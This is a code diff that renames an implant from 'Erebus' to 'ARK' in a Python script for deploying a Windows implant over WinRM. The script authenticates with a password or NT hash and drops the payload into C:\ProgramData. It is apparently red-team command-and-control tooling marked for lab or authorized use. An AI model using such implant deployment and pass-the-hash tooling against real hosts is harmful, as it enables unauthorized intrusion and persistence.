@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Deploy a Windows Erebus implant via WinRM (password or NT hash).
+"""Deploy a Windows ARK implant via WinRM (password or NT hash).
 
 Lab / authorized use only. Prefer secrets from files (never bash $$ passwords).
 
@@ -9,7 +9,7 @@ Examples:
 
   python3 scripts/deploy_winrm.py --host 10.10.10.10 --user msa_health$ --domain LOGGING \\
       --hash-file /tmp/nt.txt --implant build/implant.exe \\
-      --remote 'C:\\\\ProgramData\\\\erebus_svc.exe'
+      --remote 'C:\\\\ProgramData\\\\ark_svc.exe'
 """
 
 from __future__ import annotations
@@ -29,7 +29,7 @@ def main() -> int:
     p.add_argument("--hash-file", help="File containing NT hash (32 hex) or LM:NT")
     p.add_argument("--hash", help="NT hash hex")
     p.add_argument("--implant", required=True, help="Path to implant.exe")
-    p.add_argument("--remote", default=r"C:\ProgramData\erebus_svc.exe")
+    p.add_argument("--remote", default=r"C:\ProgramData\ark_svc.exe")
     p.add_argument("--ssl", action="store_true", help="Use HTTPS WinRM (5986)")
     args = p.parse_args()
 
@@ -94,7 +94,7 @@ def main() -> int:
         for e in streams.error:
             print("ERR:", e, file=sys.stderr)
             return 1
-    print("[+] deploy issued — check: erebus op sessions")
+    print("[+] deploy issued — check: ark op sessions")
     return 0
 
 
